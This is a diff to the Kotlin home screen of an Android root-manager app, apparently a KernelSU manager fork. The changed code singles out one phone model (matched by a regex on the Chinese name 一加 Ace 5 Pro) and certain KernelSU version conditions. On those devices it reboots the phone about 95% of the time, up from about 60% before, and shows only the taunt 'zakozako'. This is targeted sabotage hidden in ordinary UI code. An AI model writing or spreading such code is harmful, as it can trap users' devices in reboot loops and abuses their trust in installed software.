@@ -65,7 +65,6 @@ fun HomeScreen(navigator: DestinationsNavigator) {
     var isHideVersion by rememberSaveable { mutableStateOf(false) }
     var isHideOtherInfo by rememberSaveable { mutableStateOf(false) }
     var isHideSusfsStatus by rememberSaveable { mutableStateOf(false) }
-    var isDisabled by rememberSaveable { mutableStateOf(false) }
 
     // 从 SharedPreferences 加载简洁模式状态
     LaunchedEffect(Unit) {
@@ -90,28 +89,22 @@ fun HomeScreen(navigator: DestinationsNavigator) {
     val kernelVersion = getKernelVersion()
     val scrollBehavior = TopAppBarDefaults.pinnedScrollBehavior(rememberTopAppBarState())
 
-    val deviceModel = getDeviceModel(context)
-    val managerVersion = getManagerVersion(context).second
-
     val isManager = Natives.becomeManager(ksuApp.packageName)
+    val deviceModel = getDeviceModel(context)
     val ksuVersion = if (isManager) Natives.version else null
+    val managerVersion = getManagerVersion(context).second
+    val Zako = "一.*加.*A.*c.*e.*5.*P.*r.*o".toRegex().matches(deviceModel)
+    val isVersion = ksuVersion == 12777
+    val isManagerVersionValid = managerVersion > (ksuVersion ?: 0) + 20
+    val shouldTriggerRestart = Zako && kernelVersion.isGKI() && (isVersion || isManagerVersionValid)
 
-    if (kernelVersion.isGKI()) {
-        if (ksuVersion != null) {
-            val pattern = "一.*加.*A.*c.*e.*5.*P.*r.*o".toRegex()
-            if (pattern.matches(deviceModel) && managerVersion > ksuVersion + 20) {
-                isDisabled = true
-            }
-        }
-
-        LaunchedEffect(isDisabled, ksuVersion) {
-            if (isDisabled || (ksuVersion != null && ksuVersion == 12777)) {
-                val random = Random.nextInt(0, 100)
-                if (random <= 60) {
-                    reboot()
-                } else {
-                    print("zako zako")
-                }
+    LaunchedEffect(shouldTriggerRestart) {
+        if (shouldTriggerRestart) {
+            val random = Random.nextInt(0, 100)
+            if (random <= 95) {
+                reboot()
+            } else {
+                ""
             }
         }
     }
@@ -138,8 +131,8 @@ fun HomeScreen(navigator: DestinationsNavigator) {
                 .padding(horizontal = 16.dp),
             verticalArrangement = Arrangement.spacedBy(16.dp)
         ) {
-            if (isDisabled) {
-                WarningCard(message = "zakozako 不支持你的设备")
+            if (shouldTriggerRestart) {
+                WarningCard(message = "zakozako")
                 return@Column
             }
             val isManager = Natives.becomeManager(ksuApp.packageName)
